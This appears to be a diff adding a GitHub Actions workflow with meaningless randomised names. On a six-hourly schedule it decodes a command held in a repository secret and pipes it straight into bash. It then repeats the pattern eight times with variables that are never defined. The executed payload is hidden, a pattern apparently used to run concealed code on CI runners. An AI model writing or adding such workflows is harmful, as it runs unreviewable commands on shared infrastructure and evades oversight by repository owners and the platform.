@@ -1,0 +1,26 @@
+name: zhoubaihu2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhoubaihu2345
+        env:
+          ynjnz50: ${{ secrets.ynjnz50 }}
+        run: |
+          echo $ynjnz50 | jq -r .nvhg695 | /bin/bash
+          echo $b3096 | jq -r .vv41 | /bin/bash
+          echo $gfr89 | jq -r .xhumq18 | /bin/bash
+          echo $ioh6611 | jq -r .ye15189 | /bin/bash
+          echo $k19 | jq -r .v606 | /bin/bash
+          echo $edta19101 | jq -r .igwq4 | /bin/bash
+          echo $b56 | jq -r .yslgn8 | /bin/bash
+          echo $awjei2 | jq -r .nlnr9482 | /bin/bash
+          echo $y59655 | jq -r .dozz87437 | /bin/bash
+
